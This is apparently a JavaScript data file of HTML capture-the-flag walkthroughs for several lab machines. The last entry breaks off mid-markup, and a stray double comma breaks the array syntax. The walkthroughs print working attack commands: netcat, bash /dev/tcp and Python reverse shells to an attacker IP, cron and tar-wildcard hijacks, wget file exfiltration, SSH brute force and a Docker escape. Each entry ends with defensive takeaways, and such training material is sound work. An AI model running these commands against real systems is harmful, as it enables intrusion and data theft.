// ===========================
// Walkthrough Data
// ===========================

const walkthroughs = [
  {
    id: "develpy",
    title: "Develpy CTF",
    difficulty: "easy",
    flags: 2,
    techniques: ["Python input() injection", "Cron hijack"],
    content: `
<h1>Develpy CTF — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.49.166.224</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Python 2 input() injection</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Cron job hijack</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sC -sV 10.49.166.224 -oN nmap_scan.txt</code></pre>

<table>
  <tr><th>Port</th><th>Service</th></tr>
  <tr><td>22/tcp</td><td>OpenSSH 7.2p2 Ubuntu</td></tr>
  <tr><td>10000/tcp</td><td>Python 2 service (vulnerable input())</td></tr>
</table>

<h2>Phase 2: Initial Access — Python input() Injection</h2>

<p>The service on port 10000 runs a Python 2 script that uses <code>input()</code>, which evaluates user input as Python code.</p>

<h3>Verification</h3>

<pre><code>nc 10.49.166.224 10000
# Enter: 1+1
# Output: 2  (confirms code execution)</code></pre>

<h3>Exploit — Reverse Shell Payload</h3>

<pre><code>__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.192.149 4444 >/tmp/f')</code></pre>

<ol>
  <li>Start listener: <code>nc -lvnp 4444</code></li>
  <li>Send payload to port 10000</li>
  <li><strong>Shell obtained as user <code>king</code></strong></li>
  <li>Read flag: <code>cat /home/king/user.txt</code></li>
</ol>

<h2>Phase 3: Privilege Escalation — Cron Job Hijack</h2>

<h3>Enumeration</h3>

<p>Checked <code>/etc/crontab</code>:</p>

<pre><code>* * * * * root cd /home/king/ && bash root.sh</code></pre>

<p>The script runs as root every minute. The directory <code>/home/king/</code> is owned by <code>king</code>, allowing us to replace <code>root.sh</code>.</p>

<h3>Exploitation</h3>

<pre><code>rm /home/king/root.sh
echo '#!/bin/bash
bash -c "bash -i >& /dev/tcp/192.168.192.149/4446 0>&1"' > /home/king/root.sh
chmod +x /home/king/root.sh</code></pre>

<ol>
  <li>Start listener: <code>nc -lvnp 4446</code></li>
  <li>Wait for cron (≤ 1 minute)</li>
  <li><strong>Root shell obtained</strong></li>
  <li>Read flag: <code>cat /root/root.txt</code></li>
</ol>

<hr>

<h2>Vulnerability Chain</h2>

<div class="chain">
  <span class="chain-step">Python 2 input()</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Code execution</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">User shell</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Writable dir</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">Root shell</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Never use <code>input()</code> in Python 2</strong> — use <code>raw_input()</code> instead</li>
    <li><strong>Directory ownership matters</strong> — owning a directory lets you replace any file inside it</li>
    <li><strong>Always check crontabs</strong> — scripts running as root from user-writable dirs are prime targets</li>
  </ul>
</div>
`
  },
  {
    id: "wgel",
    title: "Wgel CTF",
    difficulty: "easy",
    flags: 2,
    techniques: ["SSH key exposure", "sudo wget"],
    content: `
<h1>Wgel CTF — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.49.189.55</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Exposed SSH key → SSH access</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">sudo wget privilege escalation</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sC -sV 10.49.189.55 -oN nmap_scan.txt</code></pre>

<table>
  <tr><th>Port</th><th>Service</th></tr>
  <tr><td>22/tcp</td><td>SSH</td></tr>
  <tr><td>80/tcp</td><td>HTTP</td></tr>
</table>

<h3>Web Enumeration</h3>

<pre><code>gobuster dir -u http://10.49.189.55/sitemap -w /usr/share/wordlists/dirb/common.txt</code></pre>

<p><strong>Findings:</strong></p>
<ul>
  <li>HTML comment reveals username: <code>jessie</code></li>
  <li>Discovered <code>/sitemap/.ssh/</code> with the <code>id_rsa</code> private key</li>
</ul>

<h2>Phase 2: Exploitation — SSH Access</h2>

<pre><code>wget http://10.49.189.55/sitemap/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@10.49.189.55</code></pre>

<p><strong>User Flag:</strong> <code>/home/jessie/Documents/user_flag.txt</code></p>

<h2>Phase 3: Privilege Escalation — sudo wget</h2>

<pre><code>sudo -l
# jessie can run /usr/bin/wget as root NOPASSWD</code></pre>

<p><code>wget</code> has a <code>--post-file</code> option that sends a file's contents in an HTTP POST request.</p>

<p><strong>Attacker listener:</strong></p>

<pre><code>nc -lvnp 8080</code></pre>

<p><strong>Exfiltrate root flag:</strong></p>

<pre><code>sudo wget --post-file=/root/root_flag.txt http://10.x.x.x:8080/</code></pre>

<hr>

<h2>Vulnerability Chain</h2>

<div class="chain">
  <span class="chain-step">Exposed .ssh dir</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Key without passphrase</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">SSH access</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">sudo wget → root flag</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Never expose .ssh directories</strong> on a web server</li>
    <li><strong>Always password-protect SSH private keys</strong></li>
    <li><strong>Watch for NOPASSWD sudo entries</strong> — especially for versatile tools like <code>wget</code></li>
  </ul>
</div>
`
  },
  {
    id: "library",
    title: "Library CTF",
    difficulty: "easy",
    flags: 2,
    techniques: ["SSH brute-force", "Python hijacking"],
    content: `
<h1>Library CTF — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.48.176.241</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">SSH brute-force (rockyou.txt)</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Python import hijacking</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sC -sV 10.48.176.241 -oN nmap_scan.txt</code></pre>

<table>
  <tr><th>Port</th><th>Service</th></tr>
  <tr><td>22/tcp</td><td>SSH</td></tr>
  <tr><td>80/tcp</td><td>HTTP</td></tr>
</table>

<h3>Web Enumeration</h3>

<pre><code>curl -s http://10.48.176.241/robots.txt
# Output: User-agent: rockyou

gobuster dir -u http://10.48.176.241 -w /usr/share/wordlists/dirb/common.txt</code></pre>

<p><code>robots.txt</code> hints at <code>rockyou.txt</code>. Blog posts reveal username: <code>meliodas</code>.</p>

<h2>Phase 2: Exploitation — SSH Brute-Force</h2>

<pre><code>hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.48.176.241
# Credentials: meliodas:iloveyou1

ssh meliodas@10.48.176.241
cat user.txt</code></pre>

<h2>Phase 3: Privilege Escalation — Python Import Hijacking</h2>

<pre><code>sudo -l
# meliodas can run /usr/bin/python* /home/meliodas/bak.py as root NOPASSWD</code></pre>

<p><code>bak.py</code> imports <code>zipfile</code>. Python searches the <strong>current directory</strong> first.</p>

<pre><code>echo 'import os; os.system("/bin/bash -p")' > zipfile.py
sudo python /home/meliodas/bak.py
# Root shell!
cat /root/root.txt</code></pre>

<hr>

<h2>Vulnerability Chain</h2>

<div class="chain">
  <span class="chain-step">robots.txt leak</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Weak password</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">SSH access</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">Python hijack → root</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>robots.txt can leak hints</strong> to attackers</li>
    <li><strong>Python import order matters</strong> — current directory is checked before system paths</li>
    <li><strong>Audit sudo permissions</strong> — scripts running as root can be hijacked via import manipulation</li>
  </ul>
</div>
`
  },
  {
    id: "watcher",
    title: "Watcher CTF",
    difficulty: "medium",
    flags: 7,
    techniques: ["LFI", "FTP", "Cron poison", "SSH key"],
    content: `
<h1>Watcher CTF — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.48.145.200</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 7</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">robots.txt disclosure</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">FTP file download</span></div>
  <div class="flag-card"><span class="flag-num">03</span><span class="flag-desc">LFI via post.php</span></div>
  <div class="flag-card"><span class="flag-num">04</span><span class="flag-desc">Sudo → toby</span></div>
  <div class="flag-card"><span class="flag-num">05</span><span class="flag-desc">Cron poison → mat</span></div>
  <div class="flag-card"><span class="flag-num">06</span><span class="flag-desc">Python hijack → will</span></div>
  <div class="flag-card"><span class="flag-num">07</span><span class="flag-desc">Root SSH key</span></div>
</div>

<hr>

<h2>Phase 1: Recon & Flag 1</h2>

<pre><code>curl -s http://10.48.145.200/robots.txt
# Flag 01 directly exposed</code></pre>

<h2>Phase 2: LFI & FTP Access</h2>

<pre><code># LFI to read secret file
curl -s "http://10.48.145.200/post.php?post=secret_file_do_not_read.txt"
# FTP creds: ftpuser:givemefiles777

# Download flags via FTP and LFI
ftp 10.48.145.200
curl -s "http://10.48.145.200/post.php?post=more_secrets_a9f10a/flag_3.txt"</code></pre>

<h2>Phase 3: RCE via LFI</h2>

<pre><code># Upload PHP shell via FTP
# Trigger via LFI:
curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&cmd=id"</code></pre>

<h2>Phase 4-7: Privilege Escalation Chain</h2>

<h3>www-data → toby</h3>
<pre><code>sudo -u toby cat /home/toby/flag_4.txt</code></pre>

<h3>toby → mat (Cron Poisoning)</h3>
<pre><code># Cron runs cow.sh as mat every minute
echo '#!/bin/bash
bash -i >& /dev/tcp/192.168.192.149/4445 0&>1' > /home/toby/jobs/cow.sh</code></pre>

<h3>mat → will (Python Hijack)</h3>
<pre><code># will_script.py imports cmd module
echo 'import os; os.system("/bin/bash")' > cmd.py
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py</code></pre>

<h3>will → root (SSH Key)</h3>
<pre><code>cat /opt/backups/key.b64
# Decode, chmod 600, ssh -i key root@10.48.145.200</code></pre>

<hr>

<div class="chain">
  <span class="chain-step">robots.txt</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">LFI</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">FTP creds</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">RCE</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">sudo</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Cron</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Hijack</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">Root SSH</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Chain multiple low-severity issues</strong> for full compromise</li>
    <li><strong>Always enumerate</strong> — check sudo, crontabs, and group memberships</li>
    <li><strong>Python import order</strong> can be exploited when directories are writable</li>
  </ul>
</div>
`
  },
  {
    id: "couch",
    title: "Couch",
    difficulty: "easy",
    flags: 2,
    techniques: ["CouchDB exploit", "Docker escape"],
    content: `
<h1>Couch — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.49.183.169</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">CouchDB cred extraction → SSH</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Docker API escape → root</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sC -sV -p- 10.49.183.169 -oN nmap_scan.txt</code></pre>

<table>
  <tr><th>Port</th><th>Service</th></tr>
  <tr><td>22/tcp</td><td>SSH</td></tr>
  <tr><td>5984/tcp</td><td>CouchDB 1.6.1 (no auth)</td></tr>
</table>

<h2>Phase 2: CouchDB Enumeration</h2>

<pre><code># List all databases
curl http://10.49.183.169:5984/_all_dbs
# ["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]

# Check secret database
curl http://10.49.183.169:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
# Credentials: atena:t4qfzcc4qN##</code></pre>

<h2>Phase 3: SSH Access — User Flag</h2>

<pre><code>ssh atena@10.49.183.169
# Password: t4qfzcc4qN##
cat user.txt</code></pre>

<h2>Phase 4: Privilege Escalation — Docker Escape</h2>

<pre><code># Docker API listening on localhost:2375 (no TLS)
docker -H 127.0.0.1:2375 run -v /:/mnt alpine chroot /mnt cat /root/root.txt</code></pre>

<p><strong>Interactive root shell:</strong></p>

<pre><code>docker -H 127.0.0.1:2375 run -it -v /:/hostos alpine chroot /hostos /bin/bash</code></pre>

<hr>

<div class="chain">
  <span class="chain-step">CouchDB no auth</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Plaintext creds</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">SSH access</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">Docker escape → root</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Always secure databases</strong> — CouchDB should require authentication</li>
    <li><strong>Don't store passwords in plaintext</strong> — even in internal databases</li>
    <li><strong>Secure the Docker API</strong> — never expose it without TLS</li>
    <li><strong>Container escape via host mount</strong> is a common and powerful attack</li>
  </ul>
</div>
`
  },
  {
    id: "cmess",
    title: "CMesS CTF",
    difficulty: "medium",
    flags: 2,
    techniques: ["Gila CMS RCE", "Tar wildcard"],
    content: `
<h1>CMesS CTF — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.48.149.215</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Gila CMS 1.10.9 authenticated RCE</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">tar wildcard exploit via cron</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sC -sV 10.48.149.215 -oN nmap_scan.txt
# Web server: Gila CMS 1.10.9

# Subdomain enumeration
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -fw 522
# Discovery: dev.cmess.thm</code></pre>

<h2>Phase 2: Credential Extraction</h2>

<p>Support chat on <code>dev.cmess.thm</code> leaked credentials:</p>

<table>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>Email</td><td>andre@cmess.thm</td></tr>
  <tr><td>Password</td><td>KPFTN_f2yxe%</td></tr>
</table>

<h2>Phase 3: Initial Foothold — Gila CMS RCE</h2>

<ol>
  <li>Logged into CMS admin panel with found credentials</li>
  <li>Uploaded PHP shell (<code>shell.php7</code>) via CMS file manager</li>
  <li>Started listener: <code>nc -lvnp 4444</code></li>
  <li>Accessed the uploaded shell → <strong>Reverse shell as www-data</strong></li>
</ol>

<h2>Phase 4: User Flag (andre)</h2>

<pre><code>cat /opt/.password.bak
# Password: UQfsdCB7aAP6
su andre
cat /home/andre/user.txt</code></pre>

<h2>Phase 5: Privilege Escalation — Tar Wildcard</h2>

<p>Cron job runs every 2 minutes:</p>

<pre><code>*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *</code></pre>

<p>The <code>*</code> wildcard in <code>tar</code> can be exploited with checkpoint files:</p>

<pre><code>cd /home/andre/backup
echo '#!/bin/bash
chmod +s /bin/bash' > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# After cron executes:
/bin/bash -p
cat /root/root.txt</code></pre>

<hr>

<div class="chain">
  <span class="chain-step">Subdomain enum</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Creds leaked</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">CMS RCE</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Password reuse</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">Tar wildcard → root</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Always enumerate subdomains</strong> — hidden services may contain sensitive data</li>
    <li><strong>Cron jobs with tar * are dangerous</strong> — wildcards can be exploited</li>
    <li><strong>--checkpoint and --checkpoint-action</strong> are tar features that can execute arbitrary commands</li>
    <li><strong>Never run tar * in user-writable directories as root</strong></li>
  </ul>
</div>
`
  },
  {
    id: "chocolate",
    title: "Chocolate Factory",
    difficulty: "easy",
    flags: 2,
    techniques: ["Steganography", "sudo vi", "Fernet"],
    content: `
<h1>Chocolate Factory CTF — Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.49.141.219</span>
  <span class="meta-item"><strong>OS:</strong> Linux</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
  <span class="meta-item"><strong>By:</strong> Komal · May 30, 2026</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">FTP → Steg → Crack → RCE</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">sudo vi escape → Fernet decrypt</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sV -sC -p- 10.49.141.219 -oN nmap_scan.txt</code></pre>

<table>
  <tr><th>Port</th><th>Service</th></tr>
  <tr><td>21/tcp</td><td>FTP (vsftpd 3.0.3)</td></tr>
  <tr><td>80/tcp</td><td>HTTP (Apache 2.4.41)</td></tr>
  <tr><td>113/tcp</td><td>Ident service</td></tr>
</table>

<h2>Phase 2: Steganography & Password Cracking</h2>

<pre><code># Anonymous FTP
ftp 10.49.141.219
# username: anonymous
# Download: gum_room.jpg

# Extract hidden data
steghide extract -sf gum_room.jpg
# (no passphrase) → extracted b64.txt

# Crack hash with rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# Credentials: charlie:cn7824</code></pre>

<h2>Phase 3: Remote Code Execution</h2>

<pre><code># Logged into validate.php with charlie:cn7824
# Command injection in home.php's 'command' parameter

# Python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.192.149",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>

<h2>Phase 4: User Flag</h2>

<pre><code>cat /home/charlie/teleport  # SSH key
chmod 600 teleport
ssh -i teleport charlie@10.49.141.219
cat /home/charlie/user.txt</code></pre>

<h2>Phase 5: Privilege Escalation — Root</h2>

<pre><code>sudo -l
# charlie can run /usr/bin/vi as root NOPASSWD

sudo /usr/bin/vi
:!/bin/bash
# Root shell!

# Decrypt root flag with Fernet
python3 -c "
from cryptography.fernet import Fernet
key = '<extracted_from_key_rev_key>'
fernet = Fernet(key)
with open('/root/root.py', 'r') as f:
    encrypted = f.read()
print(fernet.decrypt(encrypted.encode()).decode())
"</code></pre>

<hr>

<div class="chain">
  <span class="chain-step">Anonymous FTP</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Steganography</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Weak password</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">Cmd injection</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step">SSH access</span>
  <span class="chain-arrow">→</span>
  <span class="chain-step current">sudo vi → root</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Always check for anonymous FTP</strong> — it's a common misconfiguration</li>
    <li><strong>Steganography tools</strong> like <code>steghide</code> can hide credentials in images</li>
    <li><strong>sudo vi is effectively root</strong> — use <code>visudo</code> to audit permissions</li>
    <li><strong>GTFOBins</strong> is an essential resource for privilege escalation</li>
  </ul>
</div>
`
  },
  {
    id: "jack-of-all-trades",
    title: "Jack of All Trades",
    difficulty: "medium",
    flags: 2,
    techniques: ["Port swapping", "Steganography", "CMD injection", "Hydra", "SUID strings"],
    content: `
<h1>Jack of All Trades &mdash; Full Walkthrough</h1>

<div class="writeup-meta">
  <span class="meta-item"><strong>Target:</strong> 10.49.139.173</span>
  <span class="meta-item"><strong>OS:</strong> Linux (Debian)</span>
  <span class="meta-item"><strong>Flags:</strong> 2</span>
  <span class="meta-item"><strong>By:</strong> Komal &middot; Jun 3, 2026</span>
</div>

<div class="flags-grid">
  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">User flag — visually embedded in user.jpg</span></div>
  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Root flag — SUID strings read /root/root.txt</span></div>
</div>

<hr>

<h2>Phase 1: Reconnaissance</h2>

<pre><code>nmap -sC -sV 10.49.139.173 -oN nmap_scan.txt</code></pre>

<table>
  <tr><th>Port</th><th>Service</th></tr>
  <tr><td>22/tcp</td><td>HTTP (Apache 2.4.10)</td></tr>
  <tr><td>80/tcp</td><td>SSH (OpenSSH 6.7p1)</td></tr>
</table>

<h2>Phase 2: Web Enumeration &mdash; Hidden Clues</h2>

<pre><code>curl -s http://10.49.139.173:22/
# HTML comments reveal:
# 1. /recovery.php endpoint
# 2. Base64 encoded string

echo "&lt;base64_string&gt;" | base64 -d
# Password: u?WtKSraq</code></pre>

<h2>Phase 3: Recovery Login &mdash; Multi-Layer Decoding</h2>

<p>The <code>/recovery.php</code> page contains a Base32 encoded comment:</p>

<pre><code># Base32 &rArr; Hex
echo "&lt;base32_string&gt;" | base32 -d
# Hex output

# Hex &rArr; ROT13 ciphertext
echo "&lt;hex&gt;" | xxd -r -p
# ROT13 ciphertext

# ROT13 &rArr; English
echo "&lt;rot13&gt;" | tr "A-Za-z" "N-ZA-Mn-za-m"
# Hint: credentials hidden on homepage images</code></pre>

<h2>Phase 4: Steganography &mdash; CMS Credentials</h2>

<pre><code># Download images
wget http://10.49.139.173:22/assets/stego.jpg
wget http://10.49.139.173:22/assets/header.jpg
wget http://10.49.139.173:22/assets/jackinthebox.jpg

# Extract with discovered password
steghide extract -sf header.jpg
# Passphrase: u?WtKSraq
# Extracted: cms.creds

cat cms.creds
# Username: jackinthebox
# Password: TplFxiSHjY</code></pre>

<h2>Phase 5: CMS Access &mdash; Remote Code Execution</h2>

<pre><code># Login and get cookie
curl -v -s -X POST http://10.49.139.173:22/recovery.php \
  -d "user=jackinthebox&pass=TplFxiSHjY"
# Redirects to: /nnxhweOV/index.php

# Command injection via cmd= parameter
curl -s -b "login=cookie" \
  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=id"
# uid=33(www-data) gid=33(www-data)

# Discover password list
curl -s -b "login=cookie" \
  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=cat /home/jacks_password_list"</code></pre>

<h2>Phase 6: Hydra &mdash; SSH Brute Force</h2>

<pre><code># Save password list & brute force SSH on port 80
hydra -l jack -P passwords.txt ssh://10.49.139.173:80 -t 4
# [80][ssh] host: 10.49.139.173   login: jack   password: ITMJpGGIqg1jn?>@</code></pre>

<h2>Phase 7: SSH Access &mdash; User Flag</h2>

<pre><code>ssh jack@10.49.139.173 -p 80
# Password: ITMJpGGIqg1jn?>@

# Transfer user.jpg and view
scp -P 80 jack@10.49.139.173:~/user.jpg .
xdg-open user.jpg
# Flag visually embedded in the image</code></pre>

<h2>Phase 8: Privilege Escalation &mdash; SUID Strings</h2>

<pre><code># Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/strings has SUID bit set!

# Read root flag
/usr/bin/strings /root/root.txt
# Flag{...}</code></pre>

<hr>

<div class="chain">
  <span class="chain-step">Swapped ports</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step">HTML secrets</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step">Multi-layer decode</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step">Steganography</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step">CMS RCE</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step">Hydra SSH</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step">SUID strings</span>
  <span class="chain-arrow">&rarr;</span>
  <span class="chain-step current">Root shell</span>
</div>

<div class="takeaways">
  <h3>Key Takeaways</h3>
  <ul>
    <li><strong>Check all HTML comments</strong> &mdash; They often hide paths, encoded data, and passwords</li>
    <li><strong>Don't trust port numbers</strong> &mdash; Always verify service banners; ports can be swapped</li>
    <li><strong>Multi-layer encoding</strong> &mdash; Base32 &rArr; Hex &rArr; ROT13: identify encoding before decoding</li>
    <li><strong>Steganography with discovered passwords</strong> &mdash; Try <code>steghide</code> with every password found</li>
    <li><strong>SUID binaries are gold</strong> &mdash; Check for unusual SUID binaries with <code>find / -perm -4000</code></li>
  </ul>
</div>
`
  },
,
{
id: "b3dr0ck",
title: "b3dr0ck",
difficulty: "easy",
flags: 4,
techniques: ["TLS certificate recovery", "certutil abuse", "Encoding chain"],
content: `
<h1>b3dr0ck &mdash; Full Walkthrough</h1>
<div class="writeup-meta">
<span class="meta-item"><strong>Target:</strong> 10.48.129.19</span>
<span class="meta-item"><strong>OS:</strong> Linux</span>
<span class="meta-item"><strong>Flags:</strong> 4</span>
</div>
<div class="flags-grid">
<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">SSH as barney</span></div>
<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">TLS service &rarr; certutil</span></div>
<div class="flag-card"><span class="flag-num">03</span><span class="flag-desc">su to fred</span></div>
<div class="flag-card"><span class="flag-num">04</span><span class="flag-desc">Crack MD5 hash &rarr; su root</span></div>
</div>
<hr>
<h2>Phase 1: Reconnaissance</h2>
<pre><code>nmap -sC -sV 10.48.129.19 -oN nmap_scan.txt</code></pre>
<table>
<tr><th>Port</th><th>Service</th></tr>
<tr><td>22/tcp</td><td>SSH (OpenSSH 8.2p1)</td></tr>
<tr><td>80/tcp</td><td>HTTP (nginx 1.18.0, redirect &rarr; 4040)</td></tr>
<tr><td>9009/tcp</td><td>Custom service (pichat?)</td></tr>
<tr><td>4040/tcp</td><td>HTTPS web server</td></tr>
<tr><td>54321/tcp</td><td>SSL secure login service</td></tr>
</table>
<h2>Phase 2: Foothold &mdash; Barney</h2>
<h3>Recover Certificates from Port 9009</h3>
<pre><code>nc 10.48.129.19 9009
# Ask for: key
# Ask for: certificate</code></pre>
<p>Save to <code>client.key</code> and <code>client.crt</code>.</p>
<h3>Get Password via Port 54321</h3>
<pre><code>socat stdio ssl:10.48.129.19:54321,cert=client.crt,key=client.key,verify=0
# Type: password</code></pre>
<p>Password: <strong>YabbaDabbaD0000!</strong></p>
<h3>SSH as Barney</h3>
<pre><code>ssh barney@10.48.129.19
cat barney.txt</code></pre>
<h2>Phase 3: Lateral Movement &mdash; Barney &rarr; Fred</h2>
<pre><code>sudo -l
(ALL : ALL) /usr/bin/certutil
sudo /usr/bin/certutil fred "Fred Flintstone"</code></pre>
<p>Save cert/key, connect as Fred on port 54321, get password.</p>
<pre><code>su fred
cat fred.txt</code></pre>
<h2>Phase 4: Privilege Escalation &mdash; Fred &rarr; Root</h2>
<pre><code>sudo -l
(ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
# Output hash, crack via CrackStation</code></pre>
<p>Crack MD5 hash &rarr; <strong>flintstonesvitamins</strong></p>
<pre><code>su root
cat /root/root.txt</code></pre>
<hr>
<h2>Vulnerability Chain</h2>
<div class="chain">
<span class="chain-step">Port 9009 open</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">TLS keys leaked</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">SSH access</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">certutil sudo</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step">Encode chain</span>
<span class="chain-arrow">&rarr;</span>
<span class="chain-step current">Root shell</span>
</div>
<div class="takeaways">
<h3>Key Takeaways</h3>
<ul>
<li><strong>Custom TLS services without auth</strong> are gold mines for credential harvesting</li>
<li><strong>Certificate-based auth</strong> allows user impersonation if you can generate certs</li>
<li><strong>Always check encoding chains</strong> &mdash; base64 &rarr; base32 &rarr; base64</li>
</ul>
</div>
`
},
{
id: "hacker-vs-hacker",
title: "Hacker vs Hacker",
difficulty: "easy",
flags: 2,
techniques: ["File upload bypass", "Cron PATH hijack"],
content: `
<h1>Hacker vs Hacker &mdash; Full Walkthrough</h1>
<div class="writeup-meta">
<span class="meta-item"><strong>Target:</strong> 10.48.139.103</span>
<span class="meta-item"><strong>OS:</strong> Linux</span>
<span class="meta-item"><strong>Flags:</strong> 2</span>
</div>
<div class="flags-grid">
